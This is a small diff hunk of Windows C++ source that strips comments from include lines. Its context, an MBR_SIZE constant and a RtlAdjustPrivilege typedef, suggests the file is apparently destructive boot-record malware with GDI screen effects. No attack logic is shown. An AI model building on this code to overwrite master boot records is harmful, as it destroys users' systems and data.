@@ -4,15 +4,15 @@
 
 #define MBR_SIZE 512
 
-#include <windows.h> //windows header - used for stuff like winapi winmain() and other stuff
-#include <WinUser.h> //winuser - used for stuff like messageboxw and hwnd etc
-#include <iostream> //this literally does nothing but i have it here idk why
-#include <wingdi.h> //gdi effects
-#include <math.h> //gdi effects calculated by math
-#include <stdlib.h> //system()
-#include <thread> //std::thread()
-#include <processthreadsapi.h> //i forgot what this does
-#include <tlhelp32.h> //i also forgot what this does
+#include <windows.h>
+#include <WinUser.h>
+#include <iostream>
+#include <wingdi.h>
+#include <math.h>
+#include <stdlib.h>
+#include <thread>
+#include <processthreadsapi.h>
+#include <tlhelp32.h>
 #include <utilapiset.h>
 
 typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
